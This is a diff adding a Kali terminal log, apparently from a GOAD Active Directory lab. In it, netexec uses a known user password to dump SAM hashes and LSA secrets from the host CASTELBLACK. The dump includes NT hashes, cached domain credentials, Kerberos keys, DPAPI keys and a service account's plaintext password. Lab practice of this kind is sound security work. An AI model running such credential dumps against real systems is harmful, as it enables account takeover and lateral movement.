@@ -1,0 +1,31 @@
+──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ netexec smb 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_' --sam
+SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
+SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\jeor.mormont:_L0ngCl@w_ (Pwn3d!)
+SMB         192.168.56.22   445    CASTELBLACK      [*] Dumping SAM hashes
+SMB         192.168.56.22   445    CASTELBLACK      Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+SMB         192.168.56.22   445    CASTELBLACK      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.56.22   445    CASTELBLACK      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.56.22   445    CASTELBLACK      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4363b6dc0c95588964884d7e1dfea1f7:::
+SMB         192.168.56.22   445    CASTELBLACK      vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+SMB         192.168.56.22   445    CASTELBLACK      [+] Added 5 SAM hashes to the database
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ netexec smb 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_' --lsa
+SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)                                                                                                                                    
+SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\jeor.mormont:_L0ngCl@w_ (Pwn3d!)
+SMB         192.168.56.22   445    CASTELBLACK      [+] Dumping LSA secrets
+SMB         192.168.56.22   445    CASTELBLACK      NORTH.SEVENKINGDOMS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a: (2026-04-30 00:04:05)                                                                                                                                                       
+SMB         192.168.56.22   445    CASTELBLACK      NORTH.SEVENKINGDOMS.LOCAL/robb.stark:$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405: (2026-04-30 08:20:15)                                                                                                                                                 
+SMB         192.168.56.22   445    CASTELBLACK      NORTH\CASTELBLACK$:aes256-cts-hmac-sha1-96:ee06af36a0d289849e77ef84e9334995a1b17acc6d883f3f5edd95842b12a6b5                                                                                                                                                         
+SMB         192.168.56.22   445    CASTELBLACK      NORTH\CASTELBLACK$:aes128-cts-hmac-sha1-96:af84b815f2f5fca9ae4184a8721d5650
+SMB         192.168.56.22   445    CASTELBLACK      NORTH\CASTELBLACK$:des-cbc-md5:40493876ad7c371a
+SMB         192.168.56.22   445    CASTELBLACK      NORTH\CASTELBLACK$:plain_password_hex:44006a0022006a0062005900700051006c007200590033004100390034004f004b0079003b006f00560066002a0070004300220030003e003b005400770046005d002a003800520053006b004900610053004a004d00590054005800440039005700640055002500460027005b0038002b0041002000710038002700240072007400450066005f00270076002800540026003e006d004a002a003600680033002a004900220040002100690068005e004900560031004e0036006a004e0078004b002b0077005500220066006c0028003e00460053007500530055003100530041003f00570046005c00660077003100                                                      
+SMB         192.168.56.22   445    CASTELBLACK      NORTH\CASTELBLACK$:aad3b435b51404eeaad3b435b51404ee:dbeefc259656f0d14f1366dc00cd01d5:::
+SMB         192.168.56.22   445    CASTELBLACK      dpapi_machinekey:0xfd1db6f59aa4f8720ade5bdb7c8861f85eefb162
+dpapi_userkey:0x0642507d019855aa6b8e85492d7e992fd569055d
+SMB         192.168.56.22   445    CASTELBLACK      north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
+SMB         192.168.56.22   445    CASTELBLACK      [+] Dumped 9 LSA secrets to /home/kali/.nxc/logs/lsa/CASTELBLACK_192.168.56.22_2026-04-30_091826.secrets and /home/kali/.nxc/logs/lsa/CASTELBLACK_192.168.56.22_2026-04-30_091826.cached
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ 
